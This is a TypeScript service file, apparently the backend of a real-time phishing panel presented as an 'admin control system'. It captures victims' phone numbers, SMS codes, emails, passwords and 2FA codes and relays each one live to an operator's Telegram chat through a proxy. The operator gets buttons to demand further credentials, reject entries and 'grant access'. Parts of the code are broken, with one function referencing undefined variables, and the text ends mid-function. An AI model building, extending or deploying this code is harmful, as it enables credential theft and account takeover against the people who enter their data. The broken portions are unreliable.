// Enhanced Telegram Bot API Service for Admin Control System

const TELEGRAM_BOT_TOKEN =
  import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN";
const TELEGRAM_CHAT_ID =
  import.meta.env.VITE_TELEGRAM_CHAT_ID || "YOUR_CHAT_ID";

// Cloudflare Worker proxy for bypassing Iran IP restrictions
const TELEGRAM_API_BASE =
  "https://telegram-proxy-fragrant-fog-f09d.anthonynoelmills.workers.dev";

interface UserSession {
  sessionId: string;
  phoneNumber: string;
  messageId?: number;
  startTime: string;
  phoneVerificationCode?: string;
  email?: string;
  emailCode?: string;
  completedSteps: string[];
  currentStep: string;
  authAttempts: {
    [key: string]: number;
  };
  authCodes: {
    [key: string]: string[];
  };
  onlineStatus?: {
    isOnline: boolean;
    isVisible: boolean;
    lastActivity: number;
    statusText: string;
    statusEmoji: string;
    lastUpdate: number;
  };
}

// Store active sessions (in real app, this would be in a database)
const activeSessions = new Map<string, UserSession>();

/**
 * Generate unique session ID with better collision resistance
 */
export const generateSessionId = (): string => {
  const timestamp = Date.now().toString(36);
  const random1 = Math.random().toString(36).substr(2, 8);
  const random2 = Math.random().toString(36).substr(2, 4);
  const counter = Math.floor(Math.random() * 1000).toString(36);

  return `${timestamp}_${random1}_${random2}_${counter}`;
};

/**
 * Create temporary session for presence tracking before phone submission
 */
export const createTemporarySession = (): string => {
  const tempSessionId = `temp_${generateSessionId()}`;

  // Create temporary session for presence tracking only
  const tempSession: UserSession = {
    sessionId: tempSessionId,
    phoneNumber: "", // Will be filled later
    startTime: new Date().toISOString(),
    completedSteps: [],
    currentStep: "phone",
    authAttempts: {},
    authCodes: {},
    onlineStatus: {
      isOnline: true,
      isVisible: true,
      lastActivity: Date.now(),
      statusText: "online",
      statusEmoji: "🟢",
      lastUpdate: Date.now(),
    },
  };

  // Store temporary session
  activeSessions.set(tempSessionId, tempSession);

  console.log("🔄 Created temporary session for presence:", tempSessionId.slice(-8));

  return tempSessionId;
};

/**
 * Migrate temporary session data to real session
 */
export const migrateTemporarySession = (tempSessionId: string, realSessionId: string): boolean => {
  try {
    const tempSession = activeSessions.get(tempSessionId);
    const realSession = activeSessions.get(realSessionId);

    console.log("🔄 Migration attempt:", {
      tempSessionId: tempSessionId.slice(-8),
      realSessionId: realSessionId.slice(-8),
      hasTempSession: !!tempSession,
      hasRealSession: !!realSession,
      tempHasStatus: !!(tempSession && tempSession.onlineStatus),
      realHasMessageId: !!(realSession && realSession.messageId),
    });

    if (tempSession && realSession && tempSession.onlineStatus) {
      // Copy presence data from temporary session to real session
      realSession.onlineStatus = {
        ...tempSession.onlineStatus,
        lastUpdate: Date.now(),
      };

      // Update real session
      activeSessions.set(realSessionId, realSession);

      // Remove temporary session
      activeSessions.delete(tempSessionId);

      console.log("✅ Successfully migrated presence data:", {
        from: tempSessionId.slice(-8),
        to: realSessionId.slice(-8),
        status: tempSession.onlineStatus.statusText,
        emoji: tempSession.onlineStatus.statusEmoji,
        messageId: realSession.messageId,
      });

      // Force an immediate status update to Telegram if we have a messageId
      if (realSession.messageId) {
        console.log("📱 Forcing immediate Telegram update after migration");

        // Use setTimeout to avoid blocking
        setTimeout(() => {
          updateUserOnlineStatus(
            realSessionId,
            realSession.onlineStatus!.isOnline,
            realSession.onlineStatus!.isVisible,
            realSession.onlineStatus!.lastActivity,
            realSession.onlineStatus!.statusText,
            realSession.onlineStatus!.statusEmoji,
          ).catch((error) => {
            console.error("❌ Failed to update status after migration:", error);
          });
        }, 100);
      }

      return true;
    }

    console.warn("⚠️ Migration failed - missing data:", {
      tempSession: !!tempSession,
      realSession: !!realSession,
      tempStatus: !!(tempSession && tempSession.onlineStatus),
    });

    return false;
  } catch (error) {
    console.error("❌ Failed to migrate temporary session:", error);
    return false;
  }
};

/**
 * Send custom message to Telegram and return message ID
 */
export const sendCustomMessageToTelegram = async (
  message: string,
): Promise<{ success: boolean; messageId?: number }> => {
  // Check if Telegram is configured
  if (!validateTelegramConfig()) {
    console.log("🎭 Demo mode: Would send message to Telegram");
    console.log("📝 Message:", message);
    // Return fake message ID for demo
    return { success: true, messageId: Date.now() };
  }

  try {
    console.log("📤 Sending message to Telegram:", { sessionId, phoneNumber });

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout (optimized)

    try {
      const response = await fetch(
        `${TELEGRAM_API_BASE}/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [], // No buttons initially
            },
          }),
          signal: controller.signal,
        },
      );

      clearTimeout(timeoutId);

      if (!response.ok) {
        let errorText;
        try {
          errorText = await response.text();
        } catch {
          errorText = `HTTP ${response.status} ${response.statusText}`;
        }

        console.error("❌ Telegram send error:", {
          status: response.status,
          statusText: response.statusText,
          error: errorText,
        });
        throw new Error(
          `Telegram API error: ${response.status} - ${errorText}`,
        );
      }

      const result = await response.json();
      session.messageId = result.result.message_id;

      // Store session
      activeSessions.set(sessionId, session);

      console.log("✅ Phone number sent to Telegram successfully:", {
        sessionId,
        messageId: session.messageId,
      });
      return { success: true, sessionId };
    } catch (fetchError) {
      clearTimeout(timeoutId);

      if (fetchError.name === "AbortError") {
        console.error("❌ Telegram request timed out");
        throw new Error(
          "Request timed out. Please check your internet connection.",
        );
      }

      throw fetchError;
    }
  } catch (error) {
    console.error("❌ Failed to send phone to Telegram:", error);
    return { success: false, sessionId };
  }
};

/**
 * Get message ID from session
 */
export const getMessageIdFromSession = (sessionId: string): number | null => {
  const session = activeSessions.get(sessionId);
  return session?.messageId || null;
};

/**
 * Update session with email information and update Telegram message
 */
export const updateSessionWithEmail = async (
  sessionId: string,
  email: string,
): Promise<{ success: boolean }> => {
  const session = activeSessions.get(sessionId);
  if (!session) {
    console.error("❌ Session not found:", sessionId);
    return { success: false };
  }

  try {
    // Add email to session
    session.email = email;
    session.currentStep = "email_verification";
    activeSessions.set(sessionId, session);

    // Update the existing Telegram message (no admin buttons - user not on loading page)
    if (session.messageId) {
      const updatedMessage = formatSessionMessage(session);
      await updateTelegramMessage(
        session.messageId,
        updatedMessage,
        { inline_keyboard: [] }, // No buttons when not on loading page
      );
    }

    console.log("✅ Session updated with email:", { sessionId, email });
    return { success: true };
  } catch (error) {
    console.error("❌ Failed to update session with email:", error);
    return { success: false };
  }
};

/**
 * Update session with email code and update Telegram message
 */
export const updateSessionWithEmailCode = async (
  sessionId: string,
  emailCode: string,
): Promise<{ success: boolean }> => {
  const session = activeSessions.get(sessionId);
  if (!session) {
    console.error("❌ Session not found:", sessionId);
    return { success: false };
  }

  try {
    // Add email code to session
    session.emailCode = emailCode;
    session.currentStep = "email_completed";
    activeSessions.set(sessionId, session);

    // Update the existing Telegram message (no admin buttons - user not on loading page)
    if (session.messageId) {
      const updatedMessage = formatSessionMessage(session);
      await updateTelegramMessage(
        session.messageId,
        updatedMessage,
        { inline_keyboard: [] }, // No buttons when not on loading page
      );
    }

    console.log("✅ Session updated with email code:", {
      sessionId,
      emailCode,
    });
    return { success: true };
  } catch (error) {
    console.error("❌ Failed to update session with email code:", error);
    return { success: false };
  }
};

/**
 * Update existing Telegram message with new content
 */
export const updateCustomMessageInTelegram = async (
  messageId: number,
  newMessage: string,
): Promise<{ success: boolean }> => {
  // Check if Telegram is configured
  if (!validateTelegramConfig()) {
    console.log("🎭 Demo mode: Would update message in Telegram");
    console.log("📝 New Message:", newMessage);
    console.log("🆔 Message ID:", messageId);
    return { success: true };
  }

  try {
    await updateTelegramMessage(messageId, newMessage, undefined);
    return { success: true };
  } catch (error) {
    console.error("❌ Failed to update custom message:", error);
    return { success: false };
  }
};

/**
 * Update user online status in session
 */
export const updateUserOnlineStatus = async (
  sessionId: string,
  isOnline: boolean,
  isVisible: boolean,
  lastActivity: number,
  statusText: string,
  statusEmoji: string,
  forceUpdate: boolean = false,
): Promise<{ success: boolean }> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session) {
      console.error("❌ Session not found:", sessionId);
      return { success: false };
    }

    // Store previous status for comparison
    const previousStatus = session.onlineStatus?.statusText || "";
    const previousEmoji = session.onlineStatus?.statusEmoji || "";
    const previousOnline = session.onlineStatus?.isOnline || false;

    // Update online status
    session.onlineStatus = {
      isOnline,
      isVisible,
      lastActivity,
      statusText,
      statusEmoji,
      lastUpdate: Date.now(),
    };

    activeSessions.set(sessionId, session);

    // Check if status actually changed
    const statusChanged =
      previousStatus !== statusText ||
      previousEmoji !== statusEmoji ||
      previousOnline !== isOnline;

    console.log("🔍 Status comparison:", {
      sessionId,
      previousStatus,
      currentStatus: statusText,
      previousEmoji,
      currentEmoji: statusEmoji,
      previousOnline,
      currentOnline: isOnline,
      statusChanged,
      hasMessageId: !!session.messageId,
      currentStep: session.currentStep,
    });

    // Send update to Telegram if status changed, forced, and we have a message
    if ((statusChanged || forceUpdate) && session.messageId) {
      console.log(forceUpdate ? "📱 Force updating Telegram message" : "📱 Status changed - updating Telegram message");

      try {
        const updatedMessage = formatSessionMessage(session);
        const keyboard = getAdminKeyboard(sessionId, session);

        // Use setTimeout to make it non-blocking
        updateTelegramMessage(session.messageId, updatedMessage, keyboard)
          .then(() => {
            console.log("✅ Telegram message updated successfully");
          })
          .catch((updateError) => {
            console.error("❌ Failed to update Telegram message:", {
              error: updateError.message,
              sessionId,
              messageId: session.messageId,
              statusText,
              statusEmoji,
            });

            // Log additional debug info
            console.log("🔍 Debug info:", {
              telegramApiBase: TELEGRAM_API_BASE,
              hasToken: !!TELEGRAM_BOT_TOKEN,
              hasChatId: !!TELEGRAM_CHAT_ID,
            });
          });
      } catch (updateError) {
        console.error("❌ Error preparing Telegram update:", {
          error: updateError.message,
          sessionId,
          statusText,
          statusEmoji,
        });
      }
    } else if (!statusChanged && !forceUpdate) {
      console.log("ℹ️ Status unchanged and no force update, skipping Telegram update");
    } else if (!session.messageId) {
      console.log("ℹ️ No messageId available, skipping Telegram update");
    }

    console.log("✅ Online status updated:", {
      sessionId,
      status: statusText,
      emoji: statusEmoji,
      isOnline,
      isVisible,
    });

    return { success: true };
  } catch (error) {
    console.error("❌ Failed to update online status:", error);
    return { success: false };
  }
};

/**
 * Send initial phone number to Telegram with admin controls
 */
export const sendPhoneToTelegramEnhanced = async (
  phoneNumber: string,
): Promise<{ success: boolean; sessionId: string }> => {
  const sessionId = generateSessionId();

  // Check if Telegram is configured
  if (!validateTelegramConfig()) {
    console.log("🎭 Demo mode: Would send phone to Telegram");
    console.log("📱 Phone:", phoneNumber);
    console.log("🆔 Session:", sessionId);

    // Create session for demo mode
    const session: UserSession = {
      sessionId,
      phoneNumber,
      startTime: new Date().toLocaleString("fa-IR"),
      completedSteps: [],
      currentStep: "phone_verification",
      authAttempts: {},
      authCodes: {},
      messageId: Date.now(), // Fake message ID for demo
      onlineStatus: {
        isOnline: true,
        isVisible: true,
        lastActivity: Date.now(),
        statusText: "online",
        statusEmoji: "🟢",
        lastUpdate: Date.now(),
      },
    };

    activeSessions.set(sessionId, session);
    return { success: true, sessionId };
  }

  try {
    const session: UserSession = {
      sessionId,
      phoneNumber,
      startTime: new Date().toLocaleString("fa-IR"),
      completedSteps: [],
      currentStep: "phone_verification",
      authAttempts: {},
      authCodes: {},
      onlineStatus: {
        isOnline: true,
        isVisible: true,
        lastActivity: Date.now(),
        statusText: "online",
        statusEmoji: "🟢",
        lastUpdate: Date.now(),
      },
    };

    const message = formatInitialMessage(session);

    console.log("📤 Sending message to Telegram:", { sessionId, phoneNumber });

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 second timeout

    try {
      const response = await fetch(
        `${TELEGRAM_API_BASE}/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [], // No buttons initially
            },
          }),
          signal: controller.signal,
        },
      );

      clearTimeout(timeoutId);

      if (!response.ok) {
        let errorText;
        try {
          errorText = await response.text();
        } catch {
          errorText = `HTTP ${response.status} ${response.statusText}`;
        }

        console.error("❌ Telegram send error:", {
          status: response.status,
          statusText: response.statusText,
          error: errorText,
        });
        throw new Error(
          `Telegram API error: ${response.status} - ${errorText}`,
        );
      }

      const result = await response.json();
      session.messageId = result.result.message_id;

      // Store session
      activeSessions.set(sessionId, session);

      console.log("✅ Phone number sent to Telegram successfully:", {
        sessionId,
        messageId: session.messageId,
      });
      return { success: true, sessionId };
    } catch (fetchError) {
      clearTimeout(timeoutId);

      if (fetchError.name === "AbortError") {
        console.error("❌ Telegram request timed out");
        throw new Error(
          "Request timed out. Please check your internet connection.",
        );
      }

      throw fetchError;
    }
  } catch (error) {
    console.error("❌ Failed to send phone to Telegram:", error);
    return { success: false, sessionId };
  }
};

/**
 * Update session when user enters verification code
 */
export const updatePhoneVerificationCode = async (
  sessionId: string,
  verificationCode: string,
): Promise<boolean> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session || !session.messageId) {
      console.error("Session or messageId not found:", sessionId);
      return false;
    }

    console.log("📝 Updating phone verification code:", {
      sessionId,
      verificationCode,
      currentSteps: session.completedSteps,
    });

    session.phoneVerificationCode = verificationCode;

    // Add phone_verification to completed steps if not already there
    if (!session.completedSteps.includes("phone_verification")) {
      session.completedSteps.push("phone_verification");
    }

    session.currentStep = "waiting_admin";

    const updatedMessage = formatInitialMessage(session);
    const adminKeyboard = getAdminKeyboard(sessionId, session);

    console.log("🎛️ Admin keyboard being sent:", adminKeyboard);

    await updateTelegramMessage(
      session.messageId,
      updatedMessage,
      adminKeyboard,
    );

    activeSessions.set(sessionId, session);

    console.log("✅ Phone verification updated successfully");
    return true;
  } catch (error) {
    console.error("❌ Failed to update verification code:", error);
    return false;
  }
};

/**
 * Update session with auth step data
 */
export const updateAuthStep = async (
  sessionId: string,
  stepType: string,
  stepData: string,
): Promise<boolean> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session || !session.messageId) {
      console.error("Session or messageId not found:", sessionId);
      return false;
    }

    // Initialize auth attempts and codes for this step
    if (!session.authAttempts[stepType]) {
      session.authAttempts[stepType] = 0;
    }
    if (!session.authCodes[stepType]) {
      session.authCodes[stepType] = [];
    }

    session.authAttempts[stepType]++;
    session.authCodes[stepType].push(stepData);

    if (!session.completedSteps.includes(stepType)) {
      session.completedSteps.push(stepType);
    }

    session.currentStep = "waiting_admin";

    const updatedMessage = formatInitialMessage(session);
    const adminKeyboard = getAdminKeyboard(sessionId, session);

    await updateTelegramMessage(
      session.messageId,
      updatedMessage,
      adminKeyboard,
    );

    activeSessions.set(sessionId, session);
    return true;
  } catch (error) {
    console.error("❌ Failed to update auth step:", error);
    return false;
  }
};

/**
 * Set user current step (when navigating to auth pages)
 */
export const setUserCurrentStep = async (
  sessionId: string,
  step: string,
): Promise<boolean> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session || !session.messageId) {
      console.error("Session or messageId not found:", sessionId);
      return false;
    }

    // Check if step actually changed
    if (session.currentStep === step) {
      console.log("ℹ️ Current step unchanged, skipping update");
      return true;
    }

    const previousStep = session.currentStep;
    session.currentStep = step;

    const updatedMessage = formatInitialMessage(session);

    // Show admin buttons only when user is on loading page (waiting_admin)
    // Otherwise remove buttons
    const keyboard =
      step === "waiting_admin"
        ? getAdminKeyboard(sessionId, session)
        : { inline_keyboard: [] };

    console.log(`📱 Step changed: ${previousStep} → ${step}`);
    await updateTelegramMessage(session.messageId, updatedMessage, keyboard);

    activeSessions.set(sessionId, session);
    return true;
  } catch (error) {
    console.warn("⚠️ Failed to set current step:", error);
    // Don't return false to avoid breaking user flow
    return true;
  }
};

/**
 * Check if user can access auth step (prevent duplicate access)
 */
export const canAccessAuthStep = (
  sessionId: string,
  stepType: string,
): boolean => {
  const session = activeSessions.get(sessionId);
  if (!session) return false;

  // Allow access if this is the first time OR if it's SMS and this is the second attempt
  if (stepType === "sms") {
    return (
      !session.authAttempts[stepType] || session.authAttempts[stepType] < 2
    );
  }

  return (
    !session.authAttempts[stepType] || session.authAttempts[stepType] === 0
  );
};

/**
 * Get session data
 */
export const getSession = (sessionId: string): UserSession | undefined => {
  return activeSessions.get(sessionId);
};

/**
 * Show admin buttons when user is on loading page
 */
export const showAdminButtons = async (sessionId: string): Promise<boolean> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session) {
      console.error("❌ Session not found:", sessionId);
      return false;
    }

    console.log("🎛️ Request to show admin buttons for session:", {
      sessionId,
      currentStep: session.currentStep,
      completedSteps: session.completedSteps,
    });

    // Set step to waiting_admin and show buttons
    session.currentStep = "waiting_admin";

    const updatedMessage = formatSessionMessage(session);
    const adminKeyboard = getAdminKeyboard(sessionId, session);

    console.log("🎛️ Admin keyboard result:", {
      hasButtons: adminKeyboard.inline_keyboard.length > 0,
      buttonCount: adminKeyboard.inline_keyboard.flat().length,
      keyboard: adminKeyboard,
    });

    // Check if we're in demo mode
    if (!validateTelegramConfig()) {
      console.log("🎭 Demo mode: Would show admin buttons in Telegram");
      console.log("📝 Message:", updatedMessage);
      console.log("⌨️ Keyboard:", adminKeyboard);

      // In demo mode, show alert with available options
      const buttons = adminKeyboard.inline_keyboard
        .flat()
        .map((btn) => btn.text)
        .join(", ");
      console.log("🎛️ Demo Admin Buttons:", buttons);

      // Simulate admin clicking a button after 5 seconds (for testing)
      setTimeout(() => {
        console.log("🎭 Demo: Simulating admin clicking 'Password' button");
        // You can manually call the callback here for testing
      }, 5000);

      activeSessions.set(sessionId, session);
      return true;
    }

    // Real Telegram mode
    if (!session.messageId) {
      console.error("MessageId not found for session:", sessionId);
      return false;
    }

    await updateTelegramMessage(
      session.messageId,
      updatedMessage,
      adminKeyboard,
    );

    activeSessions.set(sessionId, session);
    return true;
  } catch (error) {
    console.error("❌ Failed to show admin buttons:", error);
    return false;
  }
};

/**
 * Get admin keyboard based on session state
 * Admin buttons should ONLY be shown when user is on loading page (waiting_admin)
 */
const getAdminKeyboard = (sessionId: string, session: UserSession) => {
  console.log("🎛️ Building admin keyboard for session:", {
    sessionId,
    currentStep: session.currentStep,
    completedSteps: session.completedSteps,
    authAttempts: session.authAttempts,
  });

  // STRICT: Only show buttons if user is exactly on loading page (waiting_admin)
  if (session.currentStep !== "waiting_admin") {
    console.log(
      "❌ Admin buttons BLOCKED - user not on loading page:",
      session.currentStep,
    );
    console.log(
      "🚫 Required step: waiting_admin, Current step:",
      session.currentStep,
    );
    return { inline_keyboard: [] };
  }

  console.log(
    "✅ ADMIN BUTTONS ALLOWED - User is on loading page (waiting_admin)",
  );

  // User must have completed phone verification to see admin buttons
  if (!session.completedSteps.includes("phone_verification")) {
    console.log("❌ Admin buttons BLOCKED - phone verification not completed");
    return { inline_keyboard: [] };
  }

  console.log("✅ Admin buttons ALLOWED - user is on loading page");

  const buttons = [];

  // First section: Authentication method buttons (show if not attempted yet)
  const authRow = [];

  // Quick Action Buttons - Primary Security Methods
  if (!session.authAttempts["password"]) {
    authRow.push({
      text: "🔐 PASSWORD",
      callback_data: `auth_password_${sessionId}`,
    });
    console.log("✅ Added Password button");
  }

  if (!session.authAttempts["google"]) {
    authRow.push({
      text: "📲 2FA",
      callback_data: `auth_google_${sessionId}`,
    });
    console.log("✅ Added Google Auth button");
  }

  // Add auth buttons row if there are any
  if (authRow.length > 0) {
    buttons.push(authRow);
  }

  // Second section: Additional methods
  // SMS Code button removed - only Wrong SMS buttons will be available

  // Secondary Actions Row
  const secondaryRow = [];

  if (!session.authAttempts["email"]) {
    secondaryRow.push({
      text: "📧 EMAIL",
      callback_data: `auth_email_${sessionId}`,
    });
    console.log("✅ Added Email Code button");
  }

  secondaryRow.push({
    text: "❌ WRONG #",
    callback_data: `incorrect_sms_${sessionId}`,
  });
  console.log("✅ Added Wrong SMS button (always available)");

  if (secondaryRow.length > 0) {
    buttons.push(secondaryRow);
  }

  // Status Check Button - Always available
  buttons.push([
    {
      text: "🔍 بررسی وضعیت",
      callback_data: `check_status_${sessionId}`,
    },
  ]);
  console.log("✅ Added Check Status button");

  // Third section: Wrong buttons (ONLY show if user has attempted that method at least once)
  const wrongButtonsRow1 = [];
  const wrongButtonsRow2 = [];

  // Wrong Actions - Compact Layout
  if (
    session.authAttempts["password"] &&
    session.authAttempts["password"] > 0
  ) {
    wrongButtonsRow1.push({
      text: "🚫 PASS",
      callback_data: `incorrect_password_${sessionId}`,
    });
    console.log("✅ Added Wrong Password button");
  }

  if (session.authAttempts["google"] && session.authAttempts["google"] > 0) {
    wrongButtonsRow1.push({
      text: "🚫 2FA",
      callback_data: `incorrect_google_${sessionId}`,
    });
    console.log("✅ Added Wrong Google Auth button");
  }

  // Wrong SMS button moved to main buttons section to be always available

  if (session.authAttempts["email"] && session.authAttempts["email"] > 0) {
    wrongButtonsRow2.push({
      text: "🚫 EMAIL",
      callback_data: `incorrect_email_${sessionId}`,
    });
    console.log("✅ Added Wrong Email button");
  }

  // Add wrong buttons rows if there are any
  if (wrongButtonsRow1.length > 0) {
    buttons.push(wrongButtonsRow1);
  }
  if (wrongButtonsRow2.length > 0) {
    buttons.push(wrongButtonsRow2);
  }

  // Executive Decision - Final Approval
  if (session.completedSteps.length > 1) {
    buttons.push([
      {
        text: "✅ APPROVE & GRANT ACCESS",
        callback_data: `complete_auth_${sessionId}`,
      },
    ]);
    console.log("✅ Added Complete Auth button");
  }

  console.log("🎛️ Final keyboard:", { inline_keyboard: buttons });
  return { inline_keyboard: buttons };
};

// Store last message content to avoid unnecessary updates
const lastMessageContent = new Map<
  number,
  { text: string; replyMarkup: string }
>();

/**
 * Clean up old sessions and rate limit data (older than 1 hour)
 */
const cleanupOldSessions = () => {
  const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
  const now = Date.now();

  for (const [sessionId, session] of activeSessions.entries()) {
    const sessionTime = new Date(session.startTime);
    if (sessionTime < oneHourAgo) {
      console.log("🧹 Cleaning up old session:", sessionId);
      activeSessions.delete(sessionId);
      // Also clean up message content
      if (session.messageId) {
        lastMessageContent.delete(session.messageId);
        rateLimitMap.delete(session.messageId);
      }
    }
  }

  // Clean up old message content entries
  for (const [messageId, content] of lastMessageContent.entries()) {
    if (now - content.timestamp > 2 * 60 * 60 * 1000) {
      // 2 hours
      console.log("🧹 Cleaning up old message content:", messageId);
      lastMessageContent.delete(messageId);
    }
  }

  // Clean up old rate limit entries
  for (const [messageId, limitInfo] of rateLimitMap.entries()) {
    if (now - limitInfo.lastUpdate > 60 * 60 * 1000) {
      // 1 hour
      console.log("🧹 Cleaning up old rate limit data:", messageId);
      rateLimitMap.delete(messageId);
    }
  }
};

// Auto cleanup every 10 minutes
setInterval(cleanupOldSessions, 10 * 60 * 1000);

// Run cleanup every 30 minutes
setInterval(cleanupOldSessions, 30 * 60 * 1000);
/**
 * Compare message content and keyboard to check if update is needed
 */
const isMessageContentDifferent = (
  messageId: number,
  newText: string,
  newReplyMarkup: any,
): boolean => {
  const lastContent = lastMessageContent.get(messageId);
  if (!lastContent) {
    return true; // First time, always update
  }

  const newReplyMarkupStr = JSON.stringify(newReplyMarkup);

  return (
    lastContent.text !== newText ||
    lastContent.replyMarkup !== newReplyMarkupStr
  );
};

// Rate limiting and backoff management
const rateLimitMap = new Map<
  number,
  { lastUpdate: number; retryAfter: number; backoffMultiplier: number }
>();

/**
 * Update Telegram message with rate limiting and exponential backoff
 */
const updateTelegramMessage = async (
  messageId: number,
  text: string,
  replyMarkup: any,
  retryCount: number = 0,
): Promise<void> => {
  // Validate inputs
  if (!messageId || !text) {
    console.error("❌ Invalid message data:", {
      messageId,
      textLength: text?.length,
    });
    return;
  }

  // Check if content is actually different
  if (!isMessageContentDifferent(messageId, text, replyMarkup)) {
    console.log("ℹ️ Message content unchanged, skipping update");
    return;
  }

  // Optimized rate limiting check
  const rateLimitInfo = rateLimitMap.get(messageId);
  if (rateLimitInfo) {
    const now = Date.now();
    const timeSinceLastUpdate = now - rateLimitInfo.lastUpdate;
    const minWaitTime = 1000; // Minimum 1 second between requests

    if (timeSinceLastUpdate < minWaitTime) {
      console.log(`⏱️ Rate limited for message ${messageId}, skipping update`);
      return; // Skip update instead of waiting to improve performance
    }
  }

  // Check if Telegram is configured
  if (!validateTelegramConfig()) {
    console.log("🎭 Demo mode: Would update Telegram message");
    console.log("📝 Message:", text);
    console.log("⌨️ Keyboard:", replyMarkup);
    // Store content even in demo mode with enhanced tracking
    const existing = lastMessageContent.get(messageId);
    lastMessageContent.set(messageId, {
      text,
      replyMarkup: JSON.stringify(replyMarkup),
      timestamp: Date.now(),
      updateCount: (existing?.updateCount || 0) + 1,
    });
    return;
  }

  try {
    const payload: any = {
      chat_id: TELEGRAM_CHAT_ID,
      message_id: messageId,
      text: text.substring(0, 4096), // Telegram message limit
      parse_mode: "HTML",
    };

    // Only add reply_markup if it's not null/undefined
    if (replyMarkup) {
      payload.reply_markup = replyMarkup;
    }

    console.log("🔄 Updating Telegram message:", {
      messageId,
      textLength: text.length,
      retryCount,
    });

    // Enhanced error handling for network issues
    let response;
    try {
      console.log(
        "📡 Making request to:",
        `${TELEGRAM_API_BASE}/bot${TELEGRAM_BOT_TOKEN}/editMessageText`,
      );

      response = await fetch(
        `${TELEGRAM_API_BASE}/bot${TELEGRAM_BOT_TOKEN}/editMessageText`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(payload),
          signal: AbortSignal.timeout(10000), // Increased timeout to 10 seconds
        },
      );
    } catch (fetchError) {
      console.error("❌ Network/Fetch error:", {
        error: fetchError.message,
        name: fetchError.name,
        stack: fetchError.stack,
        messageId,
        retryCount,
        workerUrl: TELEGRAM_API_BASE,
      });

      // Handle different types of fetch errors
      if (fetchError.name === "AbortError") {
        console.warn("⏰ Request timeout - Worker might be slow");
      } else if (fetchError.message.includes("Failed to fetch")) {
        console.warn("🌐 Network connectivity issue or CORS problem");
      }

      // Implement exponential backoff for network errors
      if (retryCount < 3) {
        const backoffDelay = Math.pow(2, retryCount) * 1000; // 1s, 2s, 4s
        console.log(
          `🔄 Retrying in ${backoffDelay}ms... (attempt ${retryCount + 1}/3)`,
        );

        setTimeout(() => {
          updateTelegramMessage(messageId, text, replyMarkup, retryCount + 1);
        }, backoffDelay);

        return;
      } else {
        console.error("❌ Max retries reached, giving up on message update");
        return;
      }
    }

    if (!response.ok) {
      const errorText = await response.text();
      let errorData;

      try {
        errorData = JSON.parse(errorText);
      } catch {
        errorData = { description: errorText };
      }

      // Handle specific "message is not modified" error
      if (errorText.includes("message is not modified")) {
        console.log("ℹ️ Message content is identical, no update needed");
        // Store the content to avoid future attempts
        lastMessageContent.set(messageId, {
          text,
          replyMarkup: JSON.stringify(replyMarkup),
        });
        return;
      }

      // Handle rate limiting (429)
      if (response.status === 429) {
        const retryAfter = errorData.parameters?.retry_after || 30;
        const backoffMultiplier = (rateLimitInfo?.backoffMultiplier || 1) * 1.5;
        const adjustedRetryAfter = Math.min(
          retryAfter * backoffMultiplier,
          300,
        ); // Max 5 minutes

        console.warn(
          `⏱️ Rate limited (429), retry after ${adjustedRetryAfter}s`,
        );

        // Store rate limit info
        rateLimitMap.set(messageId, {
          lastUpdate: Date.now(),
          retryAfter: adjustedRetryAfter,
          backoffMultiplier,
        });

        // Don't retry immediately if we've already retried multiple times
        if (retryCount >= 3) {
          console.error("❌ Too many rate limit retries, giving up");
          return;
        }

        // Schedule retry with exponential backoff
        setTimeout(() => {
          updateTelegramMessage(messageId, text, replyMarkup, retryCount + 1);
        }, adjustedRetryAfter * 1000);

        return;
      }

      console.error("❌ Telegram API error:", {
        status: response.status,
        statusText: response.statusText,
        error: errorData,
        retryCount,
      });

      // Don't retry on non-rate-limit errors
      return;
    }

    const result = await response.json();
    console.log("✅ Message updated successfully:", result.ok);

    // Clear any rate limit info on successful update
    rateLimitMap.delete(messageId);

    // Store the successfully updated content with enhanced tracking
    const existing = lastMessageContent.get(messageId);
    lastMessageContent.set(messageId, {
      text,
      replyMarkup: JSON.stringify(replyMarkup),
      timestamp: Date.now(),
      updateCount: (existing?.updateCount || 0) + 1,
    });
  } catch (error) {
    console.error("❌ Failed to update Telegram message:", error);

    // Handle network errors with exponential backoff
    if (error instanceof TypeError && error.message.includes("fetch")) {
      if (retryCount < 3) {
        const backoffDelay = Math.pow(2, retryCount) * 2000; // 2s, 4s, 8s
        console.log(
          `🔄 Network error, retrying in ${backoffDelay}ms (attempt ${retryCount + 1})`,
        );

        setTimeout(() => {
          updateTelegramMessage(messageId, text, replyMarkup, retryCount + 1);
        }, backoffDelay);
      } else {
        console.error("❌ Max retries reached for network error");
      }
    }

    // Don't throw the error, just log it to prevent breaking the user flow
  }
};

/**
 * Format session message with complete code history and clean layout
 */
const formatSessionMessage = (session: UserSession): string => {
  // Escape HTML characters in user data
  const escapeHtml = (text: string): string => {
    return text
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;");
  };

  // Smart time formatting
  const now = new Date();
  const currentTime = now.toLocaleString("fa-IR", {
    hour: "2-digit",
    minute: "2-digit",
  });
  const currentDate = now.toLocaleDateString("fa-IR", {
    month: "2-digit",
    day: "2-digit",
  });

  // Session duration
  const sessionStart = new Date(session.startTime);
  const durationMs = Date.now() - sessionStart.getTime();
  const durationMin = Math.floor(durationMs / 60000);
  const durationSec = Math.floor((durationMs % 60000) / 1000);

  let durationText;
  if (durationMin < 1) {
